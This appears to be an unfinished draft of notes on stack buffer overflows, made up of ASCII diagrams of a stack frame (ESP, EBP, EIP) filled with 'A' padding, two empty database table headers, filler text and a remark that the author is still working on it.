| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
+------------------------------------+---------------------+------+-----+
```
asd


```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+------+-----+
| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
+------------------------------------+---------------------+------+-----+
```
asd

```bash 
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
```
asd
```bash 
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
```



i am still working on it ...
